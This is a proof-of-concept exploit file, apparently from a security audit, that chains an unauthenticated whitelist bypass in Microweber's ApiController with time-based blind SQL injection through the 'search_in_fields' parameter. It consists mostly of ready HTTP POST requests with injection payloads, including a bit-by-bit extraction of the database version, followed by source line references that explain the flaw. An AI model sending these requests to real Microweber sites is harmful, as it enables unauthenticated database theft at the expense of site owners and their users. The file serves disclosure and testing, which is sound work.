### F-003 + F-001: ApiController Whitelist Bypass → SQL Injection
### Severity: CRITICAL | Auth: None | Method: POST
### Impact: Unauthenticated access to any pre-loaded class method + SQL injection
###
### STEP 1 — Verify whitelist bypass (F-003)
### DatabaseManager is always pre-loaded (ApiController loads it at line 78)
### This call bypasses api_exposed whitelist entirely via class_is_already_here branch

POST /api/MicroweberPackages/Database/DatabaseManager/get HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 32

table=content&limit=3&no_cache=1

### EXPECTED: JSON array of content rows — proves whitelist bypass
### (DatabaseManager::get() is NOT in api_exposed whitelist)

---

### STEP 2 — SQL Injection via search_in_fields (F-001)
### orWhereRaw('LOWER(`' . $field . '`) LIKE ?') — field name from user input
### Inject into backtick context to escape and add malicious SQL

POST /api/MicroweberPackages/Database/DatabaseManager/get HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 72

table=content&search=a&search_in_fields=title`)+OR+SLEEP(3)--

### EXPECTED: Response delayed ~3 seconds → confirms blind SQLi
### Time-based because backtick doubling in orWhere() calls may abort UNION-based

---

### STEP 3 — Extract DB version (time-based blind, bit-by-bit)
### Confirm SQL injection is real by extracting first byte of version()

POST /api/MicroweberPackages/Database/DatabaseManager/get HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 100

table=content&search=a&search_in_fields=title`)+AND+IF(ORD(SUBSTR(VERSION(),1,1))>53,SLEEP(3),0)--

### IF response delayed: first char of version() > '5' (ASCII 53) → true (MySQL 8.x)
### IF no delay: false → try different threshold
###
### WHY IT WORKS:
###   ApiController.php:109: class_exists('MicroweberPackages\Database\DatabaseManager', false)
###   → true (DatabaseManager loaded at line 78 for escape_string())
###   → branch 'class_is_already_here' at line 245-298
###   → return at line 298 BEFORE whitelist check at line 331/420
###   QueryFilter.php:374: orWhereRaw('LOWER(`' . $to_search_in_field . '`) LIKE ?')
###   → $to_search_in_field from $params['search_in_fields'] with only explode(',') sanitization
